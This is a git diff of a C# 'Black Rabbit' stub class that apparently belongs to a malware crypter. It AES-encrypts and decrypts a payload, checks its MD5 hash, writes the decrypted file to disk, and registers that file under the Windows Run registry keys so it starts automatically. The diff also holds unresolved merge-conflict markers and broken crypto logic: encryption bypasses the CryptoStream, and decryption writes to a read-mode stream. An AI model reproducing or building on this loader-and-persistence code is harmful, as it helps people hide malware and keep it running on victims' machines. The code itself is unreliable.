@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Security.Cryptography;
 using System.IO;
 using System.Text;
@@ -7,27 +7,40 @@ using Microsoft.Win32;
 /// <summary>
 /// Black Rabbit Stub Class
 /// </summary>
-public class brstub
+public class Brstub
 {
     //variables
 
     byte[] decrypted;
+<<<<<<< HEAD
 
     public byte[] Decrypted { get => decrypted; }
+=======
+>>>>>>> master
 
-    enum regKeyType
+    /// <summary>
+    /// Get decrypted value
+    /// </summary>
+    public byte[] Decrypted { get => decrypted; }
+
+    /// <summary>
+    /// Type of register key.
+    /// </summary>
+    public enum RegKeyType
     {
-        CurrentUser,
+#pragma warning disable CS1591
+        CurrentUser,    
         LocalMachine
+#pragma warning restore CS1591
     }
 
     //PRIVATE METHODS
 
-    private static string GetMd5Hash(MD5 md5Hash, string input)
+    private static string GetMd5Hash(MD5 md5Hash, byte[] input)
     {
 
         // Convert the input string to a byte array and compute the hash.
-        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+        byte[] data = md5Hash.ComputeHash(input);
 
         // Create a new Stringbuilder to collect the bytes
         // and create a string.
@@ -46,13 +59,41 @@ public class brstub
 
     //PUBLIC METHODS
 
+    //untested
+    /// <summary>
+    /// Generate MD5 hash.
+    /// </summary>
+    /// <param name="input">Byte array of data to hash</param>
+    /// <returns>Hash as string.</returns>
+    public static string GetMd5Hash(byte[] input)
+    {
+
+        
+        MD5 md5Hash = MD5.Create(); 
+        // Convert the input string to a byte array and compute the hash.
+        byte[] data = md5Hash.ComputeHash(input);
+
+        // Create a new Stringbuilder to collect the bytes
+        // and create a string.
+        StringBuilder sBuilder = new StringBuilder();
+
+        // Loop through each byte of the hashed data 
+        // and format each one as a hexadecimal string.
+        for (int i = 0; i < data.Length; i++)
+        {
+            sBuilder.Append(data[i].ToString("x2"));
+        }
+
+        // Return the hexadecimal string.
+        return sBuilder.ToString();
+    }
 
     /// <summary>
     /// Encrypt file with random key and IV.
     /// </summary>
     /// <param name="file">File as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
-    public Tuple<byte[], byte[], byte[]> encrypt(byte[] file)
+    public Tuple<byte[], byte[], byte[]> Encrypt(byte[] file)
     {
         byte[] encrypted;
         byte[] key;
@@ -61,11 +102,11 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
-            aesecr.Key = aesecr.GenerateKey;
+            aesecr.GenerateKey();
             aesecr.GenerateIV();
 
             key = aesecr.Key;
@@ -80,13 +121,10 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[], byte[]>(encrypted, key, IV);
@@ -96,9 +134,9 @@ public class brstub
     /// Encrypt file with user set key and random IV.
     /// </summary>
     /// <param name="file">File as byte array.</param>
-    /// <param name="IV">IV as byte array.</param>
+    /// <param name="key">Key as byte array.</param>
     /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
-    public Tuple<byte[], byte[]> encrypt(byte[] file, byte[] key)
+    public Tuple<byte[], byte[]> Encrypt(byte[] file, byte[] key)
     {
         byte[] encrypted;
         byte[] IV;
@@ -106,9 +144,9 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.GenerateIV();
@@ -124,13 +162,11 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return new Tuple<byte[], byte[]>(encrypted, IV);
@@ -143,7 +179,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns></returns>
-    public byte[] encrypt(byte[] file, byte[] key, byte[] IV)
+    public byte[] Encrypt(byte[] file, byte[] key, byte[] IV)
     {
         byte[] encrypted;
 
@@ -151,9 +187,9 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.IV = IV;
@@ -166,13 +202,11 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+                   
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return encrypted;
@@ -186,7 +220,7 @@ public class brstub
     /// <param name="key">Key as byte array.</param>
     /// <param name="IV">IV as byte array.</param>
     /// <returns>Byte array of decrypted file.</returns>
-    public byte[] decrypt(byte[] encFile, byte[] key, byte[] IV)
+    public byte[] Decrypt(byte[] encFile, byte[] key, byte[] IV)
     {
 
         
@@ -202,18 +236,15 @@ public class brstub
 
             ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);
 
-            using (var msDecrypt = new MemoryStream(enc_exe))
+            using (var msDecrypt = new MemoryStream(encFile))
             {
                 using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                 {
-                    using (var srDecrypt = new StreamReader(csDecrypt))
-                    {
-
-                        // Read the decrypted bytes from the decrypting stream
-                        // and place them in a string.
-                        decrypted = srDecrypt.ReadToEnd();
-                    }
+                    csDecrypt.Write(encFile, 0, encFile.Length);
+                    csDecrypt.Close();
                 }
+
+                decrypted = msDecrypt.ToArray();
             }
         }
 
@@ -226,7 +257,7 @@ public class brstub
     /// </summary>
     /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
     /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
-    public bool checkMD5(string hashMD5)
+    public bool CheckMD5(string hashMD5)
     {
         using ( MD5 md5Hash = MD5.Create())
         {
@@ -236,7 +267,7 @@ public class brstub
             // Create a StringComparer an compare the hashes.
             StringComparer comparer = StringComparer.OrdinalIgnoreCase;
 
-            if (0 == comparer.Compare(hashOfInput, hash)) return true;
+            if (0 == comparer.Compare(hashOfInput, hashMD5)) return true;
             
             else return false;
         }
@@ -248,7 +279,7 @@ public class brstub
     /// <param name="path">Path to save file</param>
     /// <returns>Return true if file's exist ,false if isn't exist.</returns>
     
-    public bool saveFile(string path )
+    public bool SaveFile(string path )
     {
         File.WriteAllBytes(path, decrypted);
 
@@ -262,21 +293,23 @@ public class brstub
     /// <param name="appName">App name in name field in register.</param>
     /// <param name="path">Path to file to autostart.</param>
     /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
-    /// <returns></returns>
-    public void addToReg(string appName, string path, regKeyType regKey)
+    /// <returns>True if register is set or false if error.</returns>
+    public bool AddToReg(string appName, string path, RegKeyType regKey)
     {
         RegistryKey rkApp;
-
-        if (regKey == regKeyType.CurrentUser)
+        if (regKey == RegKeyType.CurrentUser)
         {
             rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
-        else if(regKey == regKeyType.LocalMachine)
+        else if (regKey == RegKeyType.LocalMachine)
         {
             rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
+        else return false;
+
         rkApp.SetValue(appName, path);
         rkApp.Close();
+        return true;
     }
     
 }
